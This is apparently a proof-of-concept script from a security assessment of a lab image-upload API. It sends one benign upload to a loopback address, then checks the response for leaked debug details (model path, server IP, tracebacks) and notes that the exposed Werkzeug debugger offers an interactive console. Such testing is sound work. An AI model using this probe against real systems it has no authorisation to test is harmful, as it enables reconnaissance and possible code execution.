"""PoC #3 - information leakage and debug disclosure.

The response includes a debug_info block (internal model path, server IP,
version, log path), and the app runs with debug=True, so any unhandled exception
returns the Werkzeug debugger with a full traceback, source, and an interactive
console. Because of the stream-ordering bug a normal upload already triggers that
500, so we just send a valid image and capture what leaks back.

Single loopback request with a benign generated image.
"""
import os
import sys
from _labclient import post_multipart

BASE = os.environ.get("BASE", "http://127.0.0.1:8080")
URL = BASE + "/api/access"
KEY = os.environ.get("API_KEY", "")
HDRS = {"X-API-Key": KEY} if KEY else None

# A tiny valid-looking payload; the generated real JPEG is used when available.
IMG_PATH = os.environ.get("IMG", "")


def main():
    if IMG_PATH and os.path.exists(IMG_PATH):
        content = open(IMG_PATH, "rb").read()
        print(f"[*] using image {IMG_PATH} ({len(content)} bytes)")
    else:
        content = b"\xff\xd8\xff\xe0not-really-a-jpeg"
        print("[*] using placeholder bytes")
    status, body = post_multipart(URL, "image", "normal.jpg", content, "image/jpeg", headers=HDRS)
    print(f"[*] HTTP {status}")
    leak_markers = ["internal_model_path", "server_ip", "model_version",
                    "Traceback", "lab_access_api.py", "preprocess_image"]
    hits = [m for m in leak_markers if m in body]
    print(f"[*] leak markers present in response: {hits}")
    print("---- response (first 1200 chars) ----")
    print(body[:1200])
    return 0


if __name__ == "__main__":
    sys.exit(main())
